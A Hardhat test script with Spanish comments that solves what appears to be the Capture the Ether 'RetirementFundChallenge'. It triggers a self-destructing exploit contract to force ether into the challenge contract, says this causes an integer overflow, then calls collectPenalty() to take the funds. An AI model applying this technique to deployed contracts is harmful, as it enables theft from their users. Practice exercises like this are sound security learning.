import { assert, expect } from "chai";
import { ethers } from "hardhat";
import { utils } from "mocha";

const sleep = (timeToSleepInSecs: number) => new Promise((resolve) => {
  setTimeout(resolve, timeToSleepInSecs * 1000);
})

describe("Executing", function () {
  it("Solo hay que llamar al exploit", async function () {
    const hre = require("hardhat");
    const accounts = await hre.ethers.getSigners();
    // Attach to contracts
    const toa="0xBaB75cD46d449d72208F25379c5F84E58A7887A3";
    const challengeContract = await (await ethers.getContractFactory("RetirementFundChallenge")).attach(toa);
    
    const toa2="0x83Dc8f0C750a462690558eB0E01aECE697971d15";
    const exploitContract = await (await ethers.getContractFactory("exploit")).attach(toa2);
    //Hay que generar un integer overflow:
    
    //Account A calls transfer(B, 510);
    console.log("Explotando!!!");
    await exploitContract.kill(); //Traspasa fondos a contrato retirenment para que haga overflow
    await sleep(30);
    await challengeContract.collectPenalty() //Recupero la plata
    await sleep(30);
    //Validar
    expect(await challengeContract.isComplete()).to.be.true;
  });
});